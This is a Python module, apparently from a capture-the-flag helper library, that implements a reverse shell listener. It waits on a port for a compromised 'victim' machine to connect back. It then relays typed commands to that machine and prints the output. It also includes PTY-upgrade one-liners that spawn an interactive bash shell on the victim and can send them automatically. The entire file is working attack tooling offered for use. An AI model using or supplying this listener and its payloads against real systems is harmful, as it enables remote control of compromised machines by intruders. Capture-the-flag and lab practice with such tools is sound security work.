"""Reverse shell listener.

    from ctflib import reverse_shell
    reverse_shell(4444)

Waits for a connection on *port*, then everything you type is sent to the
victim and its output is printed back -- an interactive shell.
"""

from __future__ import annotations

import socket
import sys
import threading

__all__ = ["reverse_shell", "revshell", "UPGRADE_PAYLOADS"]

#: One-liners that turn a dumb shell into a PTY (see ``upgrade=True``).
UPGRADE_PAYLOADS = [
    "python3 -c 'import pty;pty.spawn(\"/bin/bash\")'",
    "python -c 'import pty;pty.spawn(\"/bin/bash\")'",
    "script -qc /bin/bash /dev/null",
]


def _accept(host, port, timeout, quiet):
    """Bind, listen, and hand back the first connection (``None`` on timeout)."""
    server = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    server.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
    try:
        server.bind((host, port))
        server.listen(1)
        server.settimeout(timeout)
        if not quiet:
            print(f"[*] listening for a reverse shell on {host}:{port} ...", flush=True)
        try:
            conn, peer = server.accept()
        except (socket.timeout, TimeoutError):
            print(f"[-] no connection within {timeout}s", flush=True)
            return None
        except KeyboardInterrupt:
            return None
    finally:
        server.close()  # only one shell is served, so free the port right away
    conn.settimeout(None)
    if not quiet:
        print(f"[+] connection from {peer[0]}:{peer[1]}", flush=True)
    return conn


def reverse_shell(port, host="0.0.0.0", *, timeout=None, upgrade=False, quiet=False, grace=1.0):
    """Listen on *port* and drop into an interactive reverse shell.

    Blocks until a shell connects (at most *timeout* seconds, forever by
    default), then relays your keystrokes as commands and prints the output.
    ``exit`` / ``quit`` / Ctrl-D ends the session, ``upgrade=True`` sends a PTY
    spawn one-liner as soon as the shell lands, and *grace* is how long to keep
    draining output after you quit so the last command is not cut off.

    Returns ``True`` if a shell connected, ``False`` if it timed out.

    This is the one function in the package with no runnable example: it blocks
    in ``accept()`` and then reads your keyboard, so the doctest is skipped.

    Example:
        >>> reverse_shell(4444)  # doctest: +SKIP
        True
    """
    conn = _accept(host, port, timeout, quiet)
    if conn is None:
        return False

    ended = threading.Event()     # the victim hung up
    quitting = threading.Event()  # we are tearing the session down ourselves

    def pump():
        """Victim output -> our stdout, until the connection drops."""
        try:
            while True:
                chunk = conn.recv(4096)
                if not chunk:
                    break
                sys.stdout.buffer.write(chunk)
                sys.stdout.buffer.flush()
        except OSError:
            pass
        finally:
            ended.set()
            if not quitting.is_set():
                print("\n[*] connection closed -- press Enter to exit", flush=True)

    def send(line):
        data = line if isinstance(line, bytes) else str(line).encode("utf-8", "replace")
        conn.sendall(data if data.endswith(b"\n") else data + b"\n")

    print(f"[*] shell attached -- type commands, Ctrl-D or 'exit' to quit\n"
          f"[*] no prompt? send:  {UPGRADE_PAYLOADS[0]}", flush=True)
    threading.Thread(target=pump, daemon=True).start()

    try:
        if upgrade:
            send(UPGRADE_PAYLOADS[0])
        while not ended.is_set():
            line = sys.stdin.readline()
            if not line or ended.is_set():  # Ctrl-D, or the victim went away
                break
            send(line)
            if line.strip() in ("exit", "quit"):
                break
    except KeyboardInterrupt:
        print("\n[*] interrupted", flush=True)
    except OSError:
        pass
    else:
        ended.wait(grace)  # let the last command's output land
    finally:
        quitting.set()
        try:
            conn.shutdown(socket.SHUT_RDWR)  # unblocks the pump thread
        except OSError:
            pass
        conn.close()
    return True


revshell = reverse_shell
